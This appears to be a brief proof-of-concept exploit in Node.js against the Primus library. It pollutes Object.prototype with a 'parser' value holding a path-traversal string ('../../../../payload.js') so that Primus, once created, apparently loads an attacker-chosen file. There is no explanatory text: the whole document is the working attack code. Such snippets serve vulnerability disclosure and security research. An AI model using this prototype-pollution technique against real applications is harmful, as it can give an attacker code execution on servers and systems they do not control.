var Primus = require('primus');
var http = require('http');

var server = http.createServer(/* request handler */);

const payload = '../../../../payload.js';
Object.prototype.parser = payload;
Object.prototype[payload] = 1;  // any value that gives true 

var primus = new Primus(server);